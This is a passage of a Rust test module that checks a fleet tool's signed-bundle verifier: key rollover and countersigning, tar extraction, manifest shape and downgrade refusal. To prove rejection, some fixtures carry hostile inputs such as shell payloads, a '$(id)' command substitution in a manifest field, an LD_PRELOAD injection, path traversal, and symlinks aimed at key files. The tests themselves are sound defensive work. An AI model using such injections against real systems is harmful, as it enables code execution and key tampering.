        let e = verify_header("#noo-bundle 2\n#node host3\ndeadbeef  ca.crt\n", "host3").unwrap_err();
        assert!(e.contains("#issued"), "{e}");
    }

    // ── which key may authorise root code ──────────────────
    //
    // These build REAL bundles with REAL openssl signatures and run the
    // REAL verifier. A source-text assertion would only prove the code says
    // what it says; the failure mode here is a node accepting (or refusing)
    // the wrong signature, which is behaviour.

    /// Serialises the tests that set the retired `NOO_APPLY_ACCEPT_CA_SIGNED`
    /// (to prove it no longer reopens anything), which is process-global.
    static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    struct Fixture {
        dir: std::path::PathBuf,
        /// Held for the life of the fixture. `NOO_APPLY_ACCEPT_CA_SIGNED` is
        /// process-global and `cargo test` runs these on threads — without
        /// this, a test that closes the compatibility lane closes it under a
        /// test that expects it open. (It did: the floor test failed in a
        /// full run and passed in isolation.)
        _env: std::sync::MutexGuard<'static, ()>,
    }

    impl Drop for Fixture {
        fn drop(&mut self) {
            std::env::remove_var("NOO_APPLY_ACCEPT_CA_SIGNED");
            let _ = std::fs::remove_dir_all(&self.dir);
        }
    }

    /// A node's `pki/` with the cluster CA pinned, plus a staging dir.
    fn fixture(name: &str) -> Fixture {
        let dir = std::env::temp_dir().join(format!("noo-r26-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("pki")).unwrap();
        std::fs::create_dir_all(dir.join("stage/files")).unwrap();
        let ca = crate::pki::ClusterCa::new(dir.join("capki"));
        ca.generate_ca("noo-test-ca", 3650).expect("ca");
        std::fs::copy(ca.ca_cert_path(), dir.join("pki/ca.crt")).unwrap();
        let guard = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        std::env::remove_var("NOO_APPLY_ACCEPT_CA_SIGNED");
        Fixture { dir, _env: guard }
    }

    fn ca_of(f: &Fixture) -> crate::pki::ClusterCa {
        crate::pki::ClusterCa::new(f.dir.join("capki"))
    }

    /// Write a manifest naming every staged file, then sign it with `key`.
    fn sign_stage(f: &Fixture, key: &Path) {
        let stage = f.dir.join("stage");
        let mut manifest = format!(
            "#noo-bundle 2\n#node host3\n#issued {}\n",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH).unwrap().as_secs()
        );
        let mut names: Vec<String> = std::fs::read_dir(stage.join("files")).unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().to_string())
            .collect();
        names.sort();
        for n in names {
            let bytes = std::fs::read(stage.join("files").join(&n)).unwrap();
            use sha2::{Digest as _, Sha256};
            manifest.push_str(&format!("{}  {n}\n", hex::encode(Sha256::digest(&bytes))));
        }
        std::fs::write(stage.join("manifest"), &manifest).unwrap();
        let ok = Command::new("openssl")
            .args(["dgst", "-sha256", "-sign"]).arg(key)
            .arg("-out").arg(stage.join("manifest.sig"))
            .arg(stage.join("manifest"))
            .status().map(|s| s.success()).unwrap_or(false);
        assert!(ok, "openssl could not sign the fixture manifest");
    }

    fn stage_file(f: &Fixture, kind: &str, body: &str) {
        std::fs::write(f.dir.join("stage/files").join(kind), body).unwrap();
    }

    fn verify(f: &Fixture) -> Result<(), String> {
        verify_bundle(&f.dir.join("stage"), &f.dir.join("pki/ca.crt"), "host3")
    }

    /// Countersign the staged manifest with `key` into `manifest.xsig.<n>`,
    /// the way the controller does for a CA-signed rollover.
    fn countersign(f: &Fixture, key: &Path, n: u32) {
        let stage = f.dir.join("stage");
        let ok = Command::new("openssl")
            .args(["dgst", "-sha256", "-sign"]).arg(key)
            .arg("-out").arg(stage.join(format!("manifest.xsig.{n}")))
            .arg(stage.join("manifest"))
            .status().map(|s| s.success()).unwrap_or(false);
        assert!(ok, "openssl could not countersign the fixture manifest");
    }

    fn lane(f: &Fixture) -> Result<&'static str, String> {
        let stage = f.dir.join("stage");
        let ca_pub = f.dir.join("ca.pub");
        let (c, o) = run(Command::new("openssl").args([
            "x509", "-pubkey", "-noout", "-in", &f.dir.join("pki/ca.crt").to_string_lossy(),
        ]));
        assert_eq!(c, 0, "{o}");
        std::fs::write(&ca_pub, format!("{o}\n")).unwrap();
        let manifest = stage.join("manifest");
        signature_lane(
            &stage,
            &f.dir.join("pki/signing.pub"),
            &ca_pub,
            &manifest_kinds(&std::fs::read_to_string(&manifest).unwrap()),
            &|pubkey, sig| {
                run(Command::new("openssl").args([
                    "dgst", "-sha256", "-verify", &pubkey.to_string_lossy(),
                    "-signature", &sig.to_string_lossy(), &manifest.to_string_lossy(),
                ])).0 == 0
            },
        )
    }

    /// The floor. If the fixture cannot produce a bundle that verifies at
    /// all, every refusal below would be vacuous.
    #[test]
    fn the_fixture_can_build_a_bundle_that_verifies() {
        let f = fixture("floor");
        let ca = ca_of(&f);
        ca.ensure_signing_key().unwrap();
        std::fs::copy(ca.signing_pub_path(), f.dir.join("pki/signing.pub")).unwrap();
        stage_file(&f, "ca.crt", "x");
        sign_stage(&f, &ca.signing_key_path());
        assert!(verify(&f).is_ok(), "{:?}", verify(&f));
        assert_eq!(lane(&f), Ok("signing-key"));
    }

    /// Once a node holds the fleet signing key, that is what authorises
    /// code — the whole point of R26.
    #[test]
    fn a_node_with_a_signing_key_accepts_a_signing_key_signature() {
        let f = fixture("accept-signing");
        let ca = ca_of(&f);
        ca.ensure_signing_key().unwrap();
        std::fs::copy(ca.signing_pub_path(), f.dir.join("pki/signing.pub")).unwrap();
        stage_file(&f, "agent-env", "NODE_ID=host3\n");
        sign_stage(&f, &ca.signing_key_path());
        assert!(verify(&f).is_ok(), "{:?}", verify(&f));
    }

    /// The bootstrap: a node that holds no signing key yet can only verify
    /// the CA, so a CA-signed bundle CARRYING `signing-pub` still adopts it.
    #[test]
    fn first_adoption_is_a_ca_signed_rollover() {
        let f = fixture("first-adoption");
        let ca = ca_of(&f);
        ca.ensure_signing_key().unwrap();
        stage_file(&f, "signing-pub", &std::fs::read_to_string(ca.signing_pub_path()).unwrap());
        sign_stage(&f, &ca.ca_key_path());
        assert!(verify(&f).is_ok(), "{:?}", verify(&f));
        assert_eq!(lane(&f), Ok("ca-rollover"));
    }

    /// An earlier release — the compatibility lane is RETIRED. A CA signature
    /// over ordinary root code (no signing-pub payload) is refused, on a node
    /// that has adopted and on one that has not, and the retired variable
    /// cannot reopen it. Without the retirement this bundle verified
    /// ("ca-legacy") by default.
    #[test]
    fn the_ca_signed_lane_is_retired_and_the_old_switch_cannot_reopen_it() {
        for adopted in [true, false] {
            let f = fixture(if adopted { "retired-adopted" } else { "retired-fresh" });
            let ca = ca_of(&f);
            ca.ensure_signing_key().unwrap();
            if adopted {
                std::fs::copy(ca.signing_pub_path(), f.dir.join("pki/signing.pub")).unwrap();
            }
            stage_file(&f, "agent-binary", "#!/bin/sh\necho pwned\n");
            sign_stage(&f, &ca.ca_key_path());
            let e = verify(&f).expect_err("the CA key alone authorised root code");
            assert!(e.contains("retired") && e.contains("(77)"), "{e}");

            std::env::set_var("NOO_APPLY_ACCEPT_CA_SIGNED", "1");
            let reopened = verify(&f);
            std::env::remove_var("NOO_APPLY_ACCEPT_CA_SIGNED");
            assert!(reopened.is_err(), "NOO_APPLY_ACCEPT_CA_SIGNED=1 reopened the retired lane");
        }
    }

    /// An earlier release — once a node holds a signing key, a CA-signed
    /// rollover must ALSO be countersigned by that key. Without it, a stolen
    /// CA key alone replaces the key that authorises code (actor F′).
    #[test]
    fn a_ca_signed_rollover_without_the_installed_keys_countersignature_is_refused() {
        let f = fixture("rollover-uncountersigned");
        let ca = ca_of(&f);
        ca.ensure_signing_key().unwrap();
        let held = crate::pki::ClusterCa::new(f.dir.join("held"));
        held.ensure_signing_key().unwrap();
        std::fs::copy(held.signing_pub_path(), f.dir.join("pki/signing.pub")).unwrap();

        stage_file(&f, "signing-pub", &std::fs::read_to_string(ca.signing_pub_path()).unwrap());
        sign_stage(&f, &ca.ca_key_path());
        let e = verify(&f).expect_err("a CA-only rollover replaced an adopted signing key");
        assert!(e.contains("countersign"), "{e}");

        // A countersignature by some OTHER key is no better.
        let stranger = crate::pki::ClusterCa::new(f.dir.join("stranger"));
        stranger.ensure_signing_key().unwrap();
        countersign(&f, &stranger.signing_key_path(), 0);
        assert!(verify(&f).is_err(), "a stranger's countersignature was accepted");
    }

    /// …and the rotation still works: the controller countersigns with the
    /// key the node holds (here the previous one, `.xsig.1`), so the node
    /// moves to the new key.
    #[test]
    fn a_rollover_countersigned_by_the_installed_key_is_accepted() {
        let f = fixture("rollover-countersigned");
        let ca = ca_of(&f);
        ca.ensure_signing_key().unwrap();
        let held = crate::pki::ClusterCa::new(f.dir.join("held"));
        held.ensure_signing_key().unwrap();
        std::fs::copy(held.signing_pub_path(), f.dir.join("pki/signing.pub")).unwrap();

        stage_file(&f, "signing-pub", &std::fs::read_to_string(ca.signing_pub_path()).unwrap());
        sign_stage(&f, &ca.ca_key_path());
        countersign(&f, &ca.signing_key_path(), 0);
        countersign(&f, &held.signing_key_path(), 1);
        assert!(verify(&f).is_ok(), "{:?}", verify(&f));
        assert_eq!(lane(&f), Ok("ca-rollover-countersigned"));
    }

    /// Extract a controller-built bundle into the fixture's stage.
    fn unpack(f: &Fixture, bundle: &Path) {
        let stage = f.dir.join("stage");
        let _ = std::fs::remove_dir_all(&stage);
        std::fs::create_dir_all(&stage).unwrap();
        extract_bundle(&std::fs::read(bundle).unwrap(), &stage).expect("a controller-built bundle extracts");
    }

    /// The controller half, end to end: a node that has NOT
    /// adopted cannot be sent a bundle at all — the CA signs nothing but the
    /// key — and the key alone, CA-signed, is a first-adoption rollover.
    #[test]
    fn the_controller_signs_nothing_but_the_key_for_a_node_that_has_not_adopted() {
        let f = fixture("ctl-first");
        let ca = ca_of(&f);
        let work = f.dir.join("work");
        std::fs::create_dir_all(&work).unwrap();
        let e = crate::commands::security_local::build_signed_bundle(
            &ca, "host3", &[("agent-binary", b"x".to_vec())], &work).expect_err("a CA-signed code bundle was built");
        assert!(e.contains("rotate-signing-key host3 --deliver-only"), "{e}");
        let e = crate::commands::security_local::build_signed_bundle_with_key(
            &ca, "host3", &[("signing-pub", b"k".to_vec()), ("applier", b"x".to_vec())], &work, &ca.ca_key_path())
            .expect_err("a CA-signed bundle carried more than the key");
        assert!(e.contains("nothing else"), "{e}");
        ca.ensure_signing_key().unwrap();
        let pubkey = std::fs::read(ca.signing_pub_path()).unwrap();
        let w2 = f.dir.join("work2");
        std::fs::create_dir_all(&w2).unwrap();
        let bundle = crate::commands::security_local::build_signed_bundle_with_key(
            &ca, "host3", &[("signing-pub", pubkey)], &w2, &ca.ca_key_path()).expect("rollover");
        unpack(&f, &bundle);
        assert_eq!(lane(&f), Ok("ca-rollover"));
        assert!(verify(&f).is_ok(), "{:?}", verify(&f));
    }

    /// The gzip wrapper is transparent: a signed bundle, gzipped by the
    /// controller (provision::gzip_bundle) and gunzipped by the system gzip
    /// the fetchers call, is the identical tar, and still verifies.
    #[test]
    fn a_gzipped_bundle_round_trips_to_the_identical_verifying_tar() {
        let f = fixture("ctl-gzip");
        let ca = ca_of(&f);
        ca.ensure_signing_key().unwrap();
        let pubkey = std::fs::read(ca.signing_pub_path()).unwrap();
        let w = f.dir.join("work-gz");
        std::fs::create_dir_all(&w).unwrap();
        let bundle = crate::commands::security_local::build_signed_bundle_with_key(
            &ca, "host3", &[("signing-pub", pubkey)], &w, &ca.ca_key_path()).expect("rollover");
        let gz = crate::commands::provision::gzip_bundle(&bundle, &w).expect("gzip");
        let gz_bytes = std::fs::read(&gz).unwrap();
        assert_eq!(&gz_bytes[..2], &[0x1f, 0x8b], "gzip magic");
        let plain = w.join("bundle.round.tar");
        let ok = Command::new("gzip").arg("-dc").arg(&gz)
            .stdout(std::fs::File::create(&plain).unwrap()).status();
        let Ok(st) = ok else { eprintln!("gzip(1) absent on this host; skipping the decompress half"); return; };
        assert!(st.success());
        assert_eq!(std::fs::read(&plain).unwrap(), std::fs::read(&bundle).unwrap(), "tar bytes differ after the round trip");
        unpack(&f, &plain);
        assert!(verify(&f).is_ok(), "{:?}", verify(&f));
    }

    /// A node offline through a rotation still holds the PREVIOUS key. The
    /// controller countersigns the rollover with every retained key, so the
    /// node moves (A2) — and nothing but the CA + a held key does it.
    #[test]
    fn a_node_that_missed_a_rotation_takes_the_countersigned_rollover() {
        let f = fixture("ctl-rotated");
        let ca = ca_of(&f);
        ca.ensure_signing_key().unwrap();
        std::fs::copy(ca.signing_pub_path(), f.dir.join("pki/signing.pub")).unwrap();
        // Rotate: the old pair is archived as signing.key.<unix>.bak.
        ca.mint_signing_key().unwrap();
        assert_eq!(ca.retained_signing_keys().len(), 2, "{:?}", ca.retained_signing_keys());
        let work = f.dir.join("work");
        std::fs::create_dir_all(&work).unwrap();
        let pubkey = std::fs::read(ca.signing_pub_path()).unwrap();
        let bundle = crate::commands::security_local::build_signed_bundle_with_key(
            &ca, "host3", &[("signing-pub", pubkey)], &work, &ca.ca_key_path()).expect("bundle");
        unpack(&f, &bundle);
        assert!(f.dir.join("stage/manifest.xsig.1").is_file(), "the archived key did not countersign");
        assert_eq!(lane(&f), Ok("ca-rollover-countersigned"));
    }

    // ── the Mac twins of the full-applier harness ──

    /// A tar with one header per (name, typeflag, link, body).
    fn tar_of(members: &[(&str, u8, &str, &[u8])]) -> Vec<u8> {
        let mut out = Vec::new();
        for (name, ty, link, body) in members {
            let mut h = [0u8; 512];
            h[..name.len()].copy_from_slice(name.as_bytes());
            h[100..107].copy_from_slice(b"0000644");
            h[124..135].copy_from_slice(format!("{:011o}", body.len()).as_bytes());
            h[156] = *ty;
            h[157..157 + link.len()].copy_from_slice(link.as_bytes());
            h[257..262].copy_from_slice(b"ustar");
            out.extend_from_slice(&h);
            out.extend_from_slice(body);
            out.resize(out.len().div_ceil(512) * 512, 0);
        }
        out.resize(out.len() + 1024, 0);
        out
    }

    #[test]
    fn the_mac_extractor_writes_only_regular_files_in_the_layout() {
        let f = fixture("extract");
        let stage = f.dir.join("x");
        std::fs::create_dir_all(&stage).unwrap();
        let ok = tar_of(&[("manifest", b'0', "", b"m"), ("manifest.sig", b'0', "", b"s"),
                          ("files/", b'5', "", b""), ("files/agent-env", b'0', "", b"NODE_ID=a\n"),
                          ("manifest.xsig.0", b'0', "", b"x")]);
        extract_bundle(&ok, &stage).expect("floor");
        assert!(stage.join("files/agent-env").is_file());
        let target = f.dir.join("pki/signing.pub");
        for (bad, why) in [
            (tar_of(&[("manifest", b'0', "", b"m"), ("files/ca.pub", b'2', &target.to_string_lossy(), b"")]), "not a regular file"),
            (tar_of(&[("ca.pub", b'2', &target.to_string_lossy(), b"")]), "not a regular file"),
            (tar_of(&[("manifest", b'0', "", b"m"), ("files/node.key", b'1', "manifest", b"")]), "not a regular file"),
            (tar_of(&[("../etc/x", b'0', "", b"x")]), "not one a bundle may carry"),
            (tar_of(&[("files/agent-env", b'0', "", b"a"), ("files/agent-env", b'0', "", b"b")]), "twice"),
        ] {
            let d = f.dir.join(format!("bad-{}", why.len()));
            let _ = std::fs::remove_dir_all(&d);
            std::fs::create_dir_all(&d).unwrap();
            let e = extract_bundle(&bad, &d).expect_err(why);
            assert!(e.contains(why), "{e}");
            assert!(!d.join("files").exists() || std::fs::read_dir(d.join("files")).unwrap().next().is_none(),
                "something was written before the refusal");
        }
    }

    #[test]
    fn an_unmanifested_file_is_refused_not_dropped() {
        let f = fixture("unlisted");
        let ca = ca_of(&f);
        ca.ensure_signing_key().unwrap();
        std::fs::copy(ca.signing_pub_path(), f.dir.join("pki/signing.pub")).unwrap();
        stage_file(&f, "agent-env", "NODE_ID=host3\n");
        sign_stage(&f, &ca.signing_key_path());
        stage_file(&f, "run-agent", "#!/bin/sh\nid\n");
        let e = verify(&f).expect_err("an unlisted file rode along");
        assert!(e.contains("does not name"), "{e}");
    }

    #[test]
    fn a_ca_signed_rollover_carrying_code_is_refused_on_the_mac() {
        let f = fixture("ca-code");
        let ca = ca_of(&f);
        ca.ensure_signing_key().unwrap();
        stage_file(&f, "signing-pub", &std::fs::read_to_string(ca.signing_pub_path()).unwrap());
        stage_file(&f, "cli-binary", "pwned");
        sign_stage(&f, &ca.ca_key_path());
        let e = verify(&f).expect_err("first adoption carried code");
        assert!(e.contains("NOTHING else"), "{e}");
    }

    #[test]
    fn a_cr_or_nul_in_a_text_kind_is_refused_on_the_mac() {
        for body in ["NODE_ID=host3\rLD_PRELOAD=/x\n", "NODE_ID=host3\0x\n"] {
            let f = fixture("crnul");
            let ca = ca_of(&f);
            ca.ensure_signing_key().unwrap();
            std::fs::copy(ca.signing_pub_path(), f.dir.join("pki/signing.pub")).unwrap();
            stage_file(&f, "agent-env", body);
            sign_stage(&f, &ca.signing_key_path());
            let e = verify(&f).expect_err("CR/NUL rode in a text kind");
            assert!(e.contains("carriage return or NUL"), "{e}");
        }
    }

    #[test]
    fn an_older_cli_is_refused_as_a_downgrade() {
        assert!(apply_generation_of(&APPLY_GENERATION_MARKER) >= APPLY_GENERATION);
        assert_eq!(apply_generation_of(b"an old noo binary without the marker"), 0);
        let f = fixture("cli-floor");
        let ca = ca_of(&f);
        ca.ensure_signing_key().unwrap();
        std::fs::copy(ca.signing_pub_path(), f.dir.join("pki/signing.pub")).unwrap();
        stage_file(&f, "cli-binary", "an old noo binary without the marker");
        sign_stage(&f, &ca.signing_key_path());
        let e = verify(&f).expect_err("a downgrade was accepted");
        assert!(e.contains("older than this one"), "{e}");
        stage_file(&f, "cli-binary", "...noo-apply-generation=01;...");
        sign_stage(&f, &ca.signing_key_path());
        assert!(verify(&f).is_ok(), "{:?}", verify(&f));
    }

    // ── second review ───────────────────────────────────────────────

    #[test]
    fn the_mac_manifest_has_one_shape() {
        let sum = "a".repeat(64);
        assert!(manifest_shape_ok(format!("#noo-bundle 2\n#node host6\n#issued 1700000000\n{sum}  agent-env\n").as_bytes()).is_ok());
        for bad in [
            format!("#issued NOW[$(id)]\n{sum}  agent-env\n"),
            format!(" {sum}  agent-env\n"),
            format!("{sum}\tagent-env\n"),
            format!("{sum}  agent-env extra\n"),
            format!("{sum}  agent-env\r\n"),
            "#issued 1234567890123\n".to_string(),
        ] {
            assert!(manifest_shape_ok(bad.as_bytes()).is_err(), "{bad:?}");
        }
    }

    #[test]
    fn a_mac_refusal_reports_the_appliers_exit_code() {
        assert_eq!(trailing_code("REFUSED — this bundle is signed by the cluster CA … (77)"), 77);
        assert_eq!(trailing_code("REFUSED agent-env — … (65)"), 65);
        assert_eq!(trailing_code("bundle untar failed"), 1);
    }

    #[test]
    fn an_untrustworthy_anchor_dir_is_refused() {
        let f = fixture("anchor-perm");
        let d = f.dir.join("worldwritable");
        std::fs::create_dir_all(&d).unwrap();
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o777)).unwrap();
        let e = root_dir_trustworthy(&d).expect_err("a 0777 dir was trusted");
        assert!(e.contains("not root-owned or is writable"), "{e}");
        let link = f.dir.join("link");
        std::os::unix::fs::symlink(&d, &link).unwrap();
        assert!(root_dir_trustworthy(&link).unwrap_err().contains("not a plain directory"));
        assert!(root_dir_trustworthy(&f.dir.join("absent")).is_ok());
    }

    #[test]
    fn the_migrated_ca_must_match_the_enroll_pin() {
        let f = fixture("anchor-pin");
        let base = f.dir.join("home");
        std::fs::create_dir_all(base.join("pki")).unwrap();
        std::fs::copy(f.dir.join("pki/ca.crt"), base.join("pki/ca.crt")).unwrap();
        std::fs::write(base.join("ca.sha256"), "00".repeat(32)).unwrap();
        let e = ensure_root_anchors_with(&read_user_anchors(&base), &f.dir.join("root"), false)
            .expect_err("a CA off the pin migrated");
        assert!(e.contains("is not the CA this Mac enrolled with"), "{e}");
        assert!(!f.dir.join("root/ca.crt").exists(), "a refused CA was written");
        let good = cert_der_sha256(&std::fs::read(base.join("pki/ca.crt")).unwrap()).unwrap();
        std::fs::write(base.join("ca.sha256"), good).unwrap();
        assert!(ensure_root_anchors_with(&read_user_anchors(&base), &f.dir.join("root2"), false).is_ok());
    }

    /// H2 third review, L5: deleting `~/noomesh/ca.sha256` used to skip the
    /// pin check and migrate whatever CA the user had put in `pki/`.
    #[test]
    fn a_deleted_pin_refuses_the_migration_rather_than_skipping_the_check() {
        let f = fixture("anchor-nopin");
        let base = f.dir.join("home");
        std::fs::create_dir_all(base.join("pki")).unwrap();
        std::fs::copy(f.dir.join("pki/ca.crt"), base.join("pki/ca.crt")).unwrap();
        let e = ensure_root_anchors_with(&read_user_anchors(&base), &f.dir.join("root"), false)
            .expect_err("a CA migrated with no pin to check it against");
        assert!(e.contains("ca.sha256") && e.contains("(77)"), "{e}");
        assert!(!f.dir.join("root/ca.crt").exists());
    }

    #[test]
    fn the_cli_floor_runs_before_the_self_update_writes() {
        let src = include_str!("node_fetch.rs");
        let at = src.find("fn self_update_and_reexec(").unwrap();
        let f = &src[at..at + src[at..].find("\n}\n").unwrap()];
        assert!(f.find("apply_generation_of(&payload)").unwrap() < f.find("root_install(&payload").unwrap());
    }

    /// Review item 9: the root apply trusts a root-owned copy, taken once
    /// from the user's dir, then never again from it.
    #[test]
    fn the_root_anchors_migrate_once_and_then_ignore_the_user_copy() {
        let f = fixture("anchors");
        let base = f.dir.join("home");
        std::fs::create_dir_all(base.join("pki")).unwrap();
        std::fs::copy(f.dir.join("pki/ca.crt"), base.join("pki/ca.crt")).unwrap();
        std::fs::write(base.join("pki/signing.pub"), "held").unwrap();
        let pin = cert_der_sha256(&std::fs::read(base.join("pki/ca.crt")).unwrap()).unwrap();
        std::fs::write(base.join("ca.sha256"), pin).unwrap();
        let root = f.dir.join("root-anchors");
        let got = ensure_root_anchors_with(&read_user_anchors(&base), &root, false).unwrap();
        assert_eq!(std::fs::read_to_string(got.join("signing.pub")).unwrap(), "held");
        // The user rewrites their copy; the root copy does not follow.
        std::fs::write(base.join("pki/signing.pub"), "attacker").unwrap();
        ensure_root_anchors_with(&read_user_anchors(&base), &root, false).unwrap();
        assert_eq!(std::fs::read_to_string(root.join("signing.pub")).unwrap(), "held");
        assert!(ROOT_ANCHOR_DIR.starts_with("/Library/"));
    }

    /// A key that is neither the CA nor the fleet signing key authorises
    /// nothing, whatever else the bundle carries.
    #[test]
    fn a_strangers_key_authorises_nothing_not_even_a_rollover() {
        let f = fixture("stranger");
        let attacker = crate::pki::ClusterCa::new(f.dir.join("attacker"));
        attacker.generate_ca("attacker", 3650).unwrap();
        stage_file(&f, "signing-pub", "-----BEGIN PUBLIC KEY-----\nAAAA\n-----END PUBLIC KEY-----\n");
        stage_file(&f, "agent-binary", "pwned");
        sign_stage(&f, &attacker.ca_key_path());
        assert!(verify(&f).is_err(), "a foreign CA key authorised a bundle");
    }

    /// `signing-pub` must be a known kind, or the applier refuses the whole
    /// bundle with 76 and the rollover can never land.
    #[test]
    fn signing_pub_is_an_accepted_kind() {
        assert!(KNOWN_KINDS.contains(&"signing-pub"));
    }

    /// The repo's `scripts/` directory, and a hard rule about not finding it.
    ///
    /// `scripts/cargo-docker.sh` used to mount only the crate
    /// directory, so `../scripts` did not exist inside the container and
    /// every test below took its `eprintln!(… skipping)` arm. The
    /// assertions were real; the harness never let them execute; the green
    /// tick said the contract was checked. That is the repo's own
    /// "tests that pass without checking" anti-pattern one level up.
    ///
    /// The harness now mounts the repo root and sets `NOO_CARGO_DOCKER=1`.
    /// Under it, an unreadable `scripts/` is a HARNESS REGRESSION and this
    /// PANICS. Outside it (a bare `cargo test` from an unpacked crate with
    /// no repo around it) the skip is still legitimate.
    fn scripts_dir() -> Option<std::path::PathBuf> {
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../scripts");
        // Assert the directory is READABLE before any test asserts on its
        // contents — the check that would have caught 97b itself.
        if root.join("noo-apply.sh").is_file() {
            return Some(root);
        }
        assert!(
            std::env::var_os("NOO_CARGO_DOCKER").is_none(),
            "scripts/ is not reachable at {} even though NOO_CARGO_DOCKER=1 — the container \
             harness stopped mounting the repo root, and every cross-language contract test \
             in this module is silently inert",
            root.display()
        );
        eprintln!("scripts/ not beside the crate and not under the container harness — skipping");
        None
    }

    // The three producers must write the same header, or a bundle from one
    // is refused by the verifier written for another.
    // Skips in the crate-only lane, which mounts noo-cli WITHOUT scripts/
    // — the same reason `kind_allowlists_agree` skips there.
    #[test]
    fn the_shell_signer_writes_the_same_header() {
        let Some(root) = scripts_dir() else { return };
        let sign = std::fs::read_to_string(root.join("sign-bundle.sh")).expect("sign-bundle.sh");
        for line in ["#noo-bundle 2", "#node $NODE", "#issued $(date -u +%s)"] {
            assert!(sign.contains(line), "sign-bundle.sh does not emit {line}");
        }
        let apply = std::fs::read_to_string(root.join("noo-apply.sh")).unwrap();
        for field in ["#noo-bundle", "#node", "#issued"] {
            assert!(
                apply.contains(&format!("s/^{field} *//p")),
                "noo-apply.sh does not read {field}"
            );
        }
    }

    /// Generate a birth keypair exactly as `enroll.rs` does on a Mac, in a
    /// directory laid out the way a Mac's `~/noomesh` is.
    fn mac_base(name: &str) -> std::path::PathBuf {
        let base = std::env::temp_dir().join(format!("noo-macbase-{}-{name}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&base).unwrap();
        let st = Command::new("openssl")
            .args(["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-sha256", "-days", "3650",
                   "-subj", "/CN=noo-birth-test", "-keyout"])
            .arg(base.join("birth.key"))
            .arg("-out")
            .arg(base.join("birth.crt"))
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
        assert!(st.map(|s| s.success()).unwrap_or(false), "openssl could not mint a fixture keypair");
        base
    }

    /// The signer had NO test that ran it. `the_two_pollers_sign_the_same_string`
    /// pinned the message format and `both_pollers_send_the_fetch_receipt`
    /// grepped for the POST — both passed on a signer that returned `None` on
    /// every real Mac, which is exactly what shipped (host6, 2026-09-12).
    ///
    /// So: run it, against a real key, and prove the bytes it produces verify.
    /// `openssl dgst -verify` is the same check the gateway's `rsa` verifier
    /// performs, on the other side of the same signature.
    /// The work dir used to be keyed on the process id alone, and `birth_proof`
    /// removes it on every exit path — so two signings in one process raced,
    /// and the loser's openssl found no directory to write `sig` into. It
    /// surfaced as `the_darwin_signer_produces_a_verifiable_signature` failing
    /// roughly once in four full runs, which reads as a flaky test rather than
    /// as the poller signing twice against one directory.
    ///
    /// Concurrency makes it deterministic: eight threads signing at once
    /// against the old code fail almost every time.
    #[test]
    fn concurrent_signings_do_not_share_a_work_dir() {
        let base = std::sync::Arc::new(mac_base("race"));
        let mut hands = Vec::new();
        for t in 0..8 {
            let base = std::sync::Arc::clone(&base);
            hands.push(std::thread::spawn(move || {
                let mut errs = Vec::new();
                for i in 0..8 {
                    let sha = "a".repeat(64);
                    if let Err(e) = birth_proof(&base, "apply", &format!("n{t}-{i}"), &sha) {
                        errs.push(e);
                    }
                }
                errs
            }));
        }
        let errs: Vec<String> = hands.into_iter().flat_map(|h| h.join().unwrap()).collect();
        assert!(errs.is_empty(), "{} of 64 concurrent signings failed: {:?}", errs.len(), errs);
    }

    #[test]
    fn the_darwin_signer_produces_a_verifiable_signature() {
        let base = mac_base("sign");
        let sha = "a".repeat(64);
        let header = birth_proof(&base, "apply", "host6", &sha)
            .unwrap_or_else(|e| panic!("the signer must produce a proof on a Mac layout: {e}"));

        let (ts, sig_b64) = header.split_once('.').expect("header is <ts>.<base64>");
        let ts: i64 = ts.parse().expect("timestamp is an integer");
        use base64::Engine as _;
        let sig = base64::engine::general_purpose::STANDARD
            .decode(sig_b64)
            .expect("signature is base64");
        assert!(!sig.is_empty(), "an empty signature is what the old code returned as None");

        // Verify against the cert's public key, over the exact string the
        // gateway will rebuild from (purpose, node, sha, ts).
        let pubk = base.join("birth.pub");
        assert!(Command::new("openssl").args(["x509", "-pubkey", "-noout", "-in"])
            .arg(base.join("birth.crt")).stdout(std::fs::File::create(&pubk).unwrap())
            .status().unwrap().success());
        let sigf = base.join("sig.bin");
        std::fs::write(&sigf, &sig).unwrap();
        let msgf = base.join("msg.txt");
        std::fs::write(&msgf, birth_proof_message("apply", "host6", &sha, ts)).unwrap();

        let out = Command::new("openssl")
            .args(["dgst", "-sha256", "-verify"]).arg(&pubk)
            .arg("-signature").arg(&sigf).arg(&msgf)
            .output().unwrap();
        assert!(
            out.status.success(),
            "the signature must verify over noo-bundle-apply:host6:<sha>:<ts> — {}{}",
            String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr)
        );
        // And it must NOT verify over a different message, or the assertion
        // above would pass on a verifier that accepts anything.
        std::fs::write(&msgf, birth_proof_message("fetch", "host6", &sha, ts)).unwrap();
        let out = Command::new("openssl")
            .args(["dgst", "-sha256", "-verify"]).arg(&pubk)
            .arg("-signature").arg(&sigf).arg(&msgf)
            .output().unwrap();
        assert!(!out.status.success(), "an apply proof must not verify as a fetch proof");
        let _ = std::fs::remove_dir_all(&base);
    }

    /// The signer reads the MAC layout — `<base>/birth.key`, where base is
    /// `/Users/<user>/noomesh` — never `/etc/noo/birth.key`, which is the
    /// Linux poller's path and does not exist on a Mac.
    #[test]
    fn the_signer_reads_the_mac_layout_and_names_the_path_when_it_is_missing() {
        let base = mac_base("layout");
        assert!(base.join("birth.key").is_file());
        assert!(birth_proof(&base, "fetch", "host6", &"b".repeat(64)).is_ok());

        // Removing exactly that file must break it — pinning WHICH path is read.
        std::fs::remove_file(base.join("birth.key")).unwrap();
        let err = birth_proof(&base, "fetch", "host6", &"b".repeat(64)).unwrap_err();
        assert!(
            err.contains(&base.join("birth.key").display().to_string()),
            "the refusal must name the path it looked at, got: {err}"
        );
        assert!(err.contains("noo enroll"), "and the command that fixes it, got: {err}");
        let _ = std::fs::remove_dir_all(&base);
    }

    /// The failure that actually shipped: openssl runs and does not produce a
